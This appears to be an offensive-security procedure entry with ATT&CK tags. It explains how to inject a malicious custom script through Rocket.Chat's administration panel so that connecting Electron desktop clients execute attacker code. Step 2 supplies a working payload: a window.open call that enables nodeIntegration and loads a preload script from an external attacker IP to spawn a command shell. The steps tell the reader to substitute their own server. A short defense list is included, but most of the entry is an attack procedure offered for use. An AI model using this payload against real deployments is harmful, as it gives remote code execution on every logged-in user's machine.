---
tags:
  - rce
  - javascript
  - custom-scripts
  - electron
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
  - Electron
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 3b6e77fa-8f53-429b-aa7d-4dd10dd61a82
created_at: '2025-12-14T17:23:42.498Z'
updated_at: '2025-12-14T17:23:42.498Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Custom-Script-in-Rocket-Chat-Server

## Summary

This procedure involves accessing the Rocket.Chat server's administration panel to inject a malicious JavaScript custom script that exploits the desktop client's Electron handling, enabling remote code execution when clients connect.

## Description

The attack targets the Custom Scripts feature in Rocket.Chat's administration panel, where an attacker with admin access can insert arbitrary JavaScript executed in the context of logged-in users. The script uses window.open to create a new BrowserWindow with nodeIntegration=true and a preload script from an external attacker-controlled server. This bypasses Electron's security model, allowing Node.js code execution on the client's machine, such as spawning command shells. Prerequisites include administrative access to the server and control over a remote host for the preload script.

## Requirements

1. Administrative credentials for the Rocket.Chat server
2. Web browser to access the admin panel
3. Attacker-controlled server hosting the malicious preload script (e.g., cmd.js that spawns CMD.exe)
4. Network accessibility for the preload script URL

## Defense

Defensive measures and detection strategies:

- Restrict administration panel access with multi-factor authentication and role-based controls
- Disable or audit Custom Scripts feature; sanitize all injected JavaScript
- In Electron apps, enforce contextIsolation=true and disable nodeIntegration by default
- Monitor for anomalous window.open calls or external preload script loads in client logs
- Use endpoint detection tools to alert on unexpected process spawns like CMD.exe from Electron processes

## Objectives

1. Inject payload to compromise connecting desktop clients
2. Enable arbitrary code execution via preload script
3. Achieve persistence or further exploitation on victim machines

## Instructions

### Step 1: Access Administration Panel

**Context**: Log in and navigate to the custom scripts configuration to prepare injection.

No command required; use the web interface:

- Log in as admin
- Navigate to Administration » Layout » Custom Scripts » Custom Script for Logged In Users

> This opens the input field for script insertion. Expected output: Interface ready for editing.

### Step 2: Insert Malicious Script

**Context**: Add JavaScript that triggers Electron exploitation upon client connection.

Insert the following in the script field:

```javascript
window.open('data:text/html,<h1>PWNED</h1>', '', ['nodeIntegration=true', 'preload=\\45.155.173.235\data\cmd.js'].join(','))
```

> Replace the IP and path with your server. This creates an insecure BrowserWindow loading external JS. Expected output: Script saved in field without validation errors.

### Step 3: Save Configuration

**Context**: Apply the changes to activate the script for all logged-in users.

Click "Save changes" in the panel.

> Expected output: Success message; script now executes on client connections.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[rce]]
- [[JavaScript]]
- [[custom-scripts]]
- [[electron]]
